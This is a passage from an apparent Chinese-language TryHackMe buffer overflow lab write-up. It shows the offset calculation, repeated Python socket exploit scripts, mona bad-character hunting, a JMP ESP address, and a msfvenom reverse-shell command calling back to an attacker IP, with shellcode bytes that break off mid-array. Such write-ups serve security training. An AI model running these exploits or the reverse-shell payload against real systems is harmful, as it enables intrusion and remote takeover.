+<p>EIP指针被溢出的数据覆盖重写为了6F63396E.根据ASCII码表对照6F是小写o的ASCII编码的十六进制,43是大写C的ACSII码的十六进制，39是数字9ASCII编码的十六进制，6E则是小写n的ASCII编码的十六进制。也就是oC9n，因为x86CPU是小端序。实际内容应该是n9Co.接着拿着这个值与MSF生成的字符串进行查找定位，即可得知缓冲区的边界。也就是从哪里开始，后续的数据会将EIP指针覆盖重写。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/tryhackme$ pattern_offset.rb -l 2000 -q n9Co<br>[*] Exact match at offset 1978<br></code></pre></td></tr></table></figure>
+
+<p>从字符串1978位开始，往后的数据会被填充进EIP寄存器中。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>ip = <span class="hljs-string">&quot;10.10.67.178&quot;</span><br>port = <span class="hljs-number">1337</span><br><br>prefix = <span class="hljs-string">&quot;OVERFLOW1 &quot;</span><br>offset = <span class="hljs-number">1978</span><br>overflow = <span class="hljs-string">&quot;A&quot;</span> * offset<br>retn = <span class="hljs-string">&quot;BBBB&quot;</span><br>padding = <span class="hljs-string">&quot;&quot;</span><br>payload = <span class="hljs-string">&quot;&quot;</span><br>postfix = <span class="hljs-string">&quot;&quot;</span><br><br>buffer = prefix + overflow + retn + padding + payload + postfix<br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br><span class="hljs-keyword">try</span>:<br>  s.connect((ip, port))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sending evil buffer...&quot;</span>)<br>  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;latin-1&quot;</span>))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done!&quot;</span>)<br><span class="hljs-keyword">except</span>:<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Could not connect.&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这个脚本会发送1978个A，也就是从1978的偏移开始，填充四个B，用来验证偏移是否正确。接着将目标程序重启，运行脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/tryhackme$ python3 exploit.py               <br>Sending evil buffer...<br>Done!<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220802224618514.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220802224618514" style="zoom:200%;" />
+
+<p>此时EIP的指针是42424242，也就是BBBB，证实了EIP的偏移量。那么接下来就需要确保shellcode在内存中能正常的执行，也就是寻找坏字符。首先在Immunity Debugger配置mona的工作路径：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-title">!mona</span> config -set workingfolder <span class="hljs-keyword">c</span>:\mona\<span class="hljs-variable">%p</span><br></code></pre></td></tr></table></figure>
+
+<p>因为\x00空字节普遍都是坏字符，可以直接去掉，首先用mona生成不包含\x00的字符串：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">!mona <span class="hljs-keyword">bytearray </span>-<span class="hljs-keyword">b </span><span class="hljs-string">&quot;\x00&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>在使用简单的python脚生成同样不包含\x00的字符串，这样生成的字符串跟mona生成的是一样的，说不过mona是在目标远程RDP登录的复制粘贴不方便，一样的\x01到\xff：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>):<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\\x&quot;</span> + <span class="hljs-string">&quot;&#123;:02x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(x), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/tryhackme$ python shell.py   <br>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff<br></code></pre></td></tr></table></figure>
+
+<p>寻找坏字节的逻辑便是，Attack机器发送如上字符串到目标缓冲区，而目标程序监听收到字符串在内存中去读取比对。看有哪些字符被CPU误当成了其他指令从而防止破坏shellcode导致无法正常执行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>ip = <span class="hljs-string">&quot;10.10.67.178&quot;</span><br>port = <span class="hljs-number">1337</span><br><br>prefix = <span class="hljs-string">&quot;OVERFLOW1 &quot;</span><br>offset = <span class="hljs-number">1978</span><br>overflow = <span class="hljs-string">&quot;A&quot;</span> * offset<br>retn = <span class="hljs-string">&quot;BBBB&quot;</span><br>padding = <span class="hljs-string">&quot;&quot;</span><br>payload = <span class="hljs-string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span><br>postfix = <span class="hljs-string">&quot;&quot;</span><br><br>buffer = prefix + overflow + retn + padding + payload + postfix<br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br><span class="hljs-keyword">try</span>:<br>  s.connect((ip, port))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sending evil buffer...&quot;</span>)<br>  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;latin-1&quot;</span>))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done!&quot;</span>)<br><span class="hljs-keyword">except</span>:<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Could not connect.&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220803002419082.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220803002419082"></p>
+<p>这便是等会儿要被利用的缓冲区。现在用mona去与对应栈段，也就是ESP地址的数据去做比对：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">!mona <span class="hljs-built_in">compare</span> -f C:\mona\oscp\<span class="hljs-keyword">bytearray.bin </span>-a <span class="hljs-number">018</span>AFA30<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220803002558475.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220803002558475"></p>
+<p>mona识别坏字符为07 08 2e 2f a0 a1.但有时候会因为一个字符前边是坏字符，从而导致坏字符后的字符也会被认为是坏字符。但是这其实对我没什么影响，因为坏字符只能一个一个去找。接下来需要把07去掉，往脚本里删了就行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>ip = <span class="hljs-string">&quot;10.10.67.178&quot;</span><br>port = <span class="hljs-number">1337</span><br><br>prefix = <span class="hljs-string">&quot;OVERFLOW1 &quot;</span><br>offset = <span class="hljs-number">1978</span><br>overflow = <span class="hljs-string">&quot;A&quot;</span> * offset<br>retn = <span class="hljs-string">&quot;BBBB&quot;</span><br>padding = <span class="hljs-string">&quot;&quot;</span><br>payload = <span class="hljs-string">&quot;\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span><br>postfix = <span class="hljs-string">&quot;&quot;</span><br><br>buffer = prefix + overflow + retn + padding + payload + postfix<br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br><span class="hljs-keyword">try</span>:<br>  s.connect((ip, port))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sending evil buffer...&quot;</span>)<br>  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;latin-1&quot;</span>))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done!&quot;</span>)<br><span class="hljs-keyword">except</span>:<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Could not connect.&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>mona生成对应的比对字符串：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">!mona <span class="hljs-keyword">bytearray </span>-<span class="hljs-keyword">b </span><span class="hljs-string">&quot;\x00\x07&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后重启程序，重新监听，运行exploit脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/tryhackme$ python exploit.py<br>Sending evil buffer...<br>Done!<br></code></pre></td></tr></table></figure>
+
+<p>注意栈段ESP会变化的：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">!mona <span class="hljs-built_in">compare</span> -f C:\mona\oscp\<span class="hljs-keyword">bytearray.bin </span>-a <span class="hljs-number">01</span>B<span class="hljs-symbol">5F</span>A30<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220803003211596.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220803003211596" style="zoom:200%;" />
+
+<p>这次坏字符识别为2e 2f a0 a1.将2e从exploit脚本中删除，同样的mona也生成不包含2e字符的字符串进行比对：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">!mona <span class="hljs-keyword">bytearray </span>-<span class="hljs-keyword">b </span><span class="hljs-string">&quot;\x00\x07\x2e&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>接着重新运行程序，重新运行脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>ip = <span class="hljs-string">&quot;10.10.67.178&quot;</span><br>port = <span class="hljs-number">1337</span><br><br>prefix = <span class="hljs-string">&quot;OVERFLOW1 &quot;</span><br>offset = <span class="hljs-number">1978</span><br>overflow = <span class="hljs-string">&quot;A&quot;</span> * offset<br>retn = <span class="hljs-string">&quot;BBBB&quot;</span><br>padding = <span class="hljs-string">&quot;&quot;</span><br>payload = <span class="hljs-string">&quot;\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span><br>postfix = <span class="hljs-string">&quot;&quot;</span><br><br>buffer = prefix + overflow + retn + padding + payload + postfix<br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br><span class="hljs-keyword">try</span>:<br>  s.connect((ip, port))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sending evil buffer...&quot;</span>)<br>  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;latin-1&quot;</span>))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done!&quot;</span>)<br><span class="hljs-keyword">except</span>:<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Could not connect.&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>再进行匹配：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">!mona <span class="hljs-built_in">compare</span> -f C:\mona\oscp\<span class="hljs-keyword">bytearray.bin </span>-a <span class="hljs-number">0196</span>FA30<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220803003757676.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220803003757676"></p>
+<p>再将a0从脚本中删除：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>ip = <span class="hljs-string">&quot;10.10.67.178&quot;</span><br>port = <span class="hljs-number">1337</span><br><br>prefix = <span class="hljs-string">&quot;OVERFLOW1 &quot;</span><br>offset = <span class="hljs-number">1978</span><br>overflow = <span class="hljs-string">&quot;A&quot;</span> * offset<br>retn = <span class="hljs-string">&quot;BBBB&quot;</span><br>padding = <span class="hljs-string">&quot;&quot;</span><br>payload = <span class="hljs-string">&quot;\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span><br>postfix = <span class="hljs-string">&quot;&quot;</span><br><br>buffer = prefix + overflow + retn + padding + payload + postfix<br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br><span class="hljs-keyword">try</span>:<br>  s.connect((ip, port))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sending evil buffer...&quot;</span>)<br>  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;latin-1&quot;</span>))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done!&quot;</span>)<br><span class="hljs-keyword">except</span>:<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Could not connect.&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>mona也生成对应的比对字符串：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">!mona <span class="hljs-keyword">bytearray </span>-<span class="hljs-keyword">b </span><span class="hljs-string">&quot;\x00\x07\x2e\xa0&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>运行脚本，进行比对：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">!mona <span class="hljs-built_in">compare</span> -f C:\mona\oscp\<span class="hljs-keyword">bytearray.bin </span>-a<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220803012250864.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220803012250864"></p>
+<p>这次变没有新的坏字符出现了。坏字符就是\x00\x07\x2e\xa0。确定坏字符后需要在目标内存中寻找没有坏字符的内存区域：</p>
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-operator">!</span><span class="hljs-variable">mona</span> <span class="hljs-variable">jmp</span> <span class="hljs-operator">-</span><span class="hljs-variable">r</span> <span class="hljs-variable">esp</span> <span class="hljs-operator">-</span><span class="hljs-variable">cpb</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x07</span>\x2e\xa0&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220803012555560.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220803012555560"></p>
+<p>日志中会打印一些结果，可以随便挑一个，记录该内存地址，625011af,因为系统是小端序的，所以要跳转的地址应该是\xaf\x11\x50\x62.将这个地址填入漏洞利用脚本的retn，也就是要将EIP的指针指向该内存地址。然后生成MSF的有效载荷，MSF可以很方便的生成不包含特定自己的有效载荷：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/shell_reverse_tcp LHOST=10.13.43.238 LPORT=4444 EXITFUNC=thread -b <span class="hljs-string">&quot;\x00\x07\x2e\xa0&quot;</span> -f c<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] = <br><span class="hljs-string">&quot;\xb8\x3f\xaa\xdc\x4b\xdb\xd3\xd9\x74\x24\xf4\x5a\x31\xc9\xb1&quot;</span><br><span class="hljs-string">&quot;\x52\x31\x42\x12\x83\xc2\x04\x03\x7d\xa4\x3e\xbe\x7d\x50\x3c&quot;</span><br><span class="hljs-string">&quot;\x41\x7d\xa1\x21\xcb\x98\x90\x61\xaf\xe9\x83\x51\xbb\xbf\x2f&quot;</span><br><span class="hljs-string">&quot;\x19\xe9\x2b\xbb\x6f\x26\x5c\x0c\xc5\x10\x53\x8d\x76\x60\xf2&quot;</span><br><span class="hljs-string">&quot;\x0d\x85\xb5\xd4\x2c\x46\xc8\x15\x68\xbb\x21\x47\x21\xb7\x94&quot;</span><br><span class="hljs-string">&quot;\x77\x46\x8d\x24\xfc\x14\x03\x2d\xe1\xed\x22\x1c\xb4\x66\x7d&quot;</span><br><span class="hljs-string">&quot;\xbe\x37\xaa\xf5\xf7\x2f\xaf\x30\x41\xc4\x1b\xce\x50\x0c\x52&quot;</span><br><span class="hljs-string">&quot;\x2f\xfe\x71\x5a\xc2\xfe\xb6\x5d\x3d\x75\xce\x9d\xc0\x8e\x15&quot;</span><br><span class="hljs-string">&quot;\xdf\x1e\x1a\x8d\x47\xd4\xbc\x69\x79\x39\x5a\xfa\x75\xf6\x28&quot;</span><br><span 